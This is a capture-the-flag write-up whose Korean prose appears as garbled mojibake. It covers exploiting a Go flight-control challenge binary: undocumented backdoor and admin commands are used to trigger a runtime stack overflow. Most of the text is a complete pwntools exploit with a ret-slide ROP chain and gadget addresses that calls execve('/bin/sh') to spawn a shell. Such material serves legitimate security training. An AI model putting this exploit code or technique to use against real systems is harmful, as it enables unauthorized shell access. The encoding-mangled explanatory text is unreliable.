# ğŸ‘® êµ­ë°©ë³¸ë¶€
> êµ­ë°©ë³¸ë¶€ì˜ ë¹„í–‰ ì›ê²© ì¡°ì¢… ì‹œìŠ¤í…œì„ ë§Œë“¤ì–´ ë†“ì€ ë¬¸ì œì´ë‹¤.

## Analysis
ì»¤ë§¨ë“œ í˜•ì‹ìœ¼ë¡œ ëª…ë ¹ì„ ë‚´ë¦´ ìˆ˜ ìˆëŠ” í”„ë¡œê·¸ë¨ì´ë¼ ë¨¼ì € ì»¤ë§¨ë“œ êµ¬ì¡°ë¥¼ ì•Œì•„ì•¼ í•˜ëŠ”ë° ë¶„ì„í•˜ë©´ ë‹¤ìŒê³¼ ê°™ë‹¤.
```py
# 1byte(cmdIndex) + 1byte(numberOfCmd) + 4byte(cmdValueLength) + cmdValue

struct CmdStruct {
    unsigned char cmdIndex;
    unsigned char numberOfCmd;
    unsigned int cmdValueLength;
    unsigned char* cmdValue
}
```

ìœ„ êµ¬ì¡°ë¥¼ í† ëŒ€ë¡œ íŒŒì´ì¬ í•¨ìˆ˜ë¥¼ ì‘ì„±í•´ë³´ë©´ ë‹¤ìŒê³¼ ê°™ë‹¤.
```py
def cP(_cmd, _cmdNum, _val, ex=False): # cmdProcessing
    cmdIndex = _cmd
    numberOfCmd = noc(_cmdNum)
    cmd = ''

    s.send(cmdIndex + numberOfCmd)

    val = str(_val)
    s.send(p32(len(val))) # value_len
    s.send(val.ljust(len(val), '\x00')) # value
```

ë©”ë‰´ì—ì„œ ì„¤ëª…í•˜ëŠ” ì»¤ë§¨ë“œ ë²ˆí˜¸ì™€ ì‹¤í–‰ì„ ìœ„í•œ ì»¤ë§¨ë“œ ë²ˆí˜¸ê°€ ë‹¬ë¼ì„œ ì¼ì¼íˆ ë¶„ì„í•´ì•¼ í•˜ëŠ”ë°, ì´ëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤.
```py
V - Inc Alti
W - Dec Alti
R - Set Alti
T - Get Alti
X - Inc Speed
Y - Dec Speed
U - Get Speed
S - Set Speed
Z - GetFlightStatus
M - ADDQ
N - SUBQ
Q - PRINTQ
\x03 - ReplayLog
\x02 - LogFlight
\x01 - GetInfo
d - DEBUG
\\ - Admin Command
[ - Backdoor
```

ë¶„ì„í•´ë³´ë©´ ë©”ë‰´ì—ì„œ ì„¤ëª…ë˜ì–´ ìˆì§€ ì•ŠëŠ” `\\\\, [` ì»¤ë§¨ë“œê°€ ì¡´ì¬í•˜ê¸° ë•Œë¬¸ì—, ì—¬ê¸°ì„œë¶€í„° ë¶„ì„ì„ ì§„í–‰í•˜ì˜€ë‹¤.

`\\\\` ì»¤ë§¨ë“œë¥¼ ì‹¤í–‰í•˜ë ¤ë©´ `StatusDebugMode`ê°€ í™œì„±í™” ë˜ì–´ì•¼ í•˜ëŠ”ë°, ì´ëŠ” `[` ì»¤ë§¨ë“œë¥¼ ì´ìš©í•˜ë©´ í™œì„±í™”ì‹œí‚¬ ìˆ˜ ìˆë‹¤.

ì´ë ‡ê²Œ í™œì„±í™”ì‹œí‚¤ë©´ `\\\\` ì»¤ë§¨ë“œì—ì„œ `runtime_memmove` í•¨ìˆ˜ë¥¼ ì‹¤í–‰ì‹œí‚¤ëŠ”ë°, ê¸¸ì´ ì¸ìë¥¼ `StatusFlightNameLength`ì—ì„œ ê°€ì ¸ì˜¤ê¸° ë•Œë¬¸ì— ì´ë¥¼ `[` ì»¤ë§¨ë“œë¥¼ ì´ìš©í•˜ì—¬ ìˆ˜ì •í•˜ë©´ ëŸ°íƒ€ì„ ìŠ¤íƒ ì˜¤ë²„í”Œë¡œìš°ë¥¼ ì¼ìœ¼í‚¬ ìˆ˜ ìˆë‹¤.

ëŸ°íƒ€ì„ ìŠ¤íƒì—ì„œ ì˜¤ë²„í”Œë¡œìš°ê°€ ë‚˜ê³ , ì´ë¥¼ ì“°ë ˆë“œë¡œ ëŒê³  ìˆëŠ” `goroutine`ë“¤ì´ fs ë ˆì§€ìŠ¤í„°ë¡œë¶€í„° ì°¸ì¡°í•˜ë©´ì„œ ROPê°€ ê°€ëŠ¥í•œë°, íŠ¹ì • ì“°ë ˆë“œê°€ ê³ ì¥ë‚˜ë©´ ë©”ì¸ ì“°ë ˆë“œì—ì„œ íŠ¸ë ˆì´ìŠ¤ë¥¼ ë‚´ê³  ì¢…ë£Œë˜ê¸° ë•Œë¬¸ì— ëª¨ë“  ì“°ë ˆë“œì—ì„œ ROPë¥¼ ì§„í–‰í•´ì•¼ í•œë‹¤. 

`ret slide`ë¥¼ í†µí•´ ëª¨ë“  ì“°ë ˆë“œì—ì„œ ROPê°€ ê°€ëŠ¥í•˜ë‹¤.

íŠ¹íˆ, golang elfì—ëŠ” `libc`ê°€ ì¡´ì¬í•˜ì§€ ì•Šê¸° ë•Œë¬¸ì— `syscall`ì„ ì´ìš©í•˜ì—¬ `execve("/bin/sh", 0, 0)`ì„ ë¶€ë¥´ë©´ ëœë‹¤.
## Entire Exploit Code
```py
from pwn import *

# context.log_level = 'debug'

e = ELF('./System')
l = e.libc

'''
  1. ADDQ <data>: Add data to the arrival queue
  2. SUBQ <key>: Retrieve data from the arrival queue and store it with the specified key
  3. PRINTQ <key>: Print the stored data associated with the specified key
  4. DEBUG: Display debug information
  5. GETINFO: Get flight information
  6. LOGFLIGHT <log>: Add a log entry to the flight log
  7. REPLAYLOGS: Replay the flight logs
  8. SETALTITUDE <altitude>: Set the altitude of the flight
  9. SETSPEED <speed>: Set the speed of the flight
 10. GETALTITUDE: Get the current altitude of the flight
 11. GETSPEED: Get the current speed of the flight
 12. INCREASEALTITUDE <amount>: Increase the altitude of the flight by the specified amount
 13. DECREASEALTITUDE <amount>: Decrease the altitude of the flight by the specified amount
 14. INCREASESPEED <amount>: Increase the speed of the flight by the specified amount
 15. DECREASESPEED <amount>: Decrease the speed of the flight by the specified amount
 16. GETFLIGHTSTATUS: Get the current flight status
 17. FoldFlap <flapnumber> <swtich>: Activate the plane's flap function.
'''

def _sleep(_t):
    # sleep(_t)
    pass

def menu(sel):
    # s.sendlineafter(b">\n", sel)
    s.sendline(sel)
    _sleep(0.1)

def noc(numberOfCmd):
    numberOfCmd = bytes([numberOfCmd])
    return numberOfCmd.decode('latin1')

gs = '''
b* 0x4a9b70
'''
# gs = ''

def db(s):
    gdb.attach(s, gdbscript=gs)
    pause()

s = process(e.path)

def cP(_cmd, _cmdNum, _val, ex=False):
    cmdIndex = _cmd
    numberOfCmd = noc(_cmdNum)
    cmd = ''

    s.send(cmdIndex + numberOfCmd)
    _sleep(0.1)

    if not ex:
        val = str(_val)
        s.send(p32(len(val))) # value_len
        _sleep(0.1)
        s.send(val.ljust(len(val), '\x00')) # value
        _sleep(0.1)

def cD(_val):
    val = str(_val)
    s.send(p32(len(val))) # value_len
    _sleep(0.1)
    s.send(str(val).ljust(len(val), '\x00')) # value
    _sleep(0.1)

'''
V - Inc Alti
W - Dec Alti
R - Set Alti
T - Get Alti
X - Inc Speed
Y - Dec Speed
U - Get Speed
S - Set Speed
Z - GetFlightStatus
M - ADDQ
N - SUBQ
Q - PRINTQ
\x03 - ReplayLog
\x02 - LogFlight
\x01 - GetInfo
d - DEBUG
'''

'''
main_Flight.Storage['StatusDebugMode'] = 'T'/'t'/'1'/1
main_Flight.Storage['StatusFlightNameLength'] = 'True'
main_Flight.Storage['Q_new_flight_name'] = 'A'*0x100
'''
# main_Flight.Storage['StatusDebugMode'] = 'T'/'t'/'1'/1
cP('[', 2, 'DebugMode')
cD('True')
# main_Flight.Storage['StatusFlightNameLength'] = 'True'
cP('[', 2, 'FlightNameLength')
cD('False')

# pay = cyclic(cyclic_find(b'usqeusreusseu')) # runtime.futex
# pay = cyclic(cyclic_find(b'qmqeqmreqmseqmt')) # runtime.usleep
# print(hex(cyclic_find(b'qmqeqmreqmseqmt')))
# pay = b"A"*0x20000
pay = bytes.fromhex('''
4343453939383939
5b02000009000000
44656275674d6f64
6500000004000000
44656275674d6f64
6500000000000000
5472756554727565
5472756500000000
5374617475734465
6275674d6f646500
5b02000010000000
0500000000000000
466c696768744e61
6d654c656e677468
466c696768744e61
6d654c656e677468
46616c736546616c
7365000000000000
46616c7365000000
4d01000000bf0300
4e0100000f000000
5c01000002000000
6e65775f666c6967
68745f6e616d6500
6e65775f666c6967
68745f6e616d6500
3635363554727565
''')

dummy = 0x558570

pay = p64(0x401046) * (0x20000)
# pay = cyclic(cyclic_find(b'gehghehgiehgje')) # runtime.futex
# pay = cyclic(cyclic_find(b'yxjnyyjnyzjnz')) # runtime.memmove

ret = 0x401046
prax = 0x00406401
prdi = 0x00000000004100dd # rax is valid
prsi = 0x00417a2f # adc rax
prdx = 0x0041e26e # add al; xchg esp, eax
syscall = 0x004663c9

context.arch = 'amd64'

pay = p64(ret) * 0x20000

# execve('/bin/sh', 0, 0)
pay += flat(
    prax,
    dummy,
    prdi,
    0,
    prsi,
    0x559000,
    prdx,
    0x10,
    prax,
    0,
    syscall,
)
pay += flat(
    prax,
    0x558570,
    prdi,
    0x559000,
    prsi,
    0,
    prdx,
    0,
    prax,
    0x3b,
    syscall
)
# main_Flight.Storage['Q_new_flight_name'] = 'A'*0x100
cP('M', 1, '', True) # target is rbp-0x1b0
s.send(p32(len(pay)))
s.send(pay)
cP('N', 1, 'new_flight_name')

# cP('d', 1, 0x41)
# db(s)

# boom
cP('\\', 1, 0x41)

# pause()
s.send(b"/bin/sh\x00")
s.send(b'id')
s.interactive()
```